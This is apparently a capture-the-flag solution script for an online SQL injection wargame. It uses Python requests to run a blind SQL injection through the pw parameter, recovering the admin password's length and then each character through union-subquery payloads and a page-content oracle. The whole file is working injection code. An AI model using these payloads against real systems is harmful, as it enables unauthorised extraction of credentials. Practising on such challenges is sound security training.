import requests

cookie={'PHPSESSID':''}
url="https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"

# flag_len
flag_len=0
for i in range(1,50):
  query="?pw='||id='admin' and (select 1 union select (length(pw)={}))%23".format(i);
  res=requests.get(url+query, cookies=cookie)
  if (res.text.find("<strong>")!=-1):
    flag_len=i
    break

print("flag_len:{}".format(flag_len))


# flag
flag=""
for i in range(1,flag_len+1):
  for j in range(33,128):
    query="?pw='||id='admin' and (select 1 union select (ascii(substr(pw,{},1))={}))%23".format(i,j)
    res=requests.get(url+query, cookies=cookie)
    
    if (res.text.find("<strong>")!=-1):
      flag+=chr(j)
      print(flag)
      break

print("flag:{}".format(flag))
